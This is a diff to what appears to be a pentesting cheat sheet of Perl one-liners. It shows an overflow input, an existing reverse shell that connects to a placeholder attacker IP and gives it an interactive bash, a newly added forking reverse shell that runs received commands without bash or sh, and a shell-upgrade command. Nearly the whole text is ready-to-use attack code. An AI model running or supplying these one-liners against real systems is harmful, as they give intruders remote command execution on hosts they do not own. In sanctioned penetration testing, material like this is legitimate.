@@ -2791,6 +2791,9 @@ $(perl -e 'print "\x41" x 20 . "ABCD"')
 # reverse shell
 perl -e 'use Socket;$i="attacker_IP_here";$p=port_here;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 
+# reverse shell without bash/sh
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr, "IP_here:port_here");STDIN->fdopen($c,r);$~->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
 # upgrade shell
 perl -e 'exec "/bin/bash"'
 ```
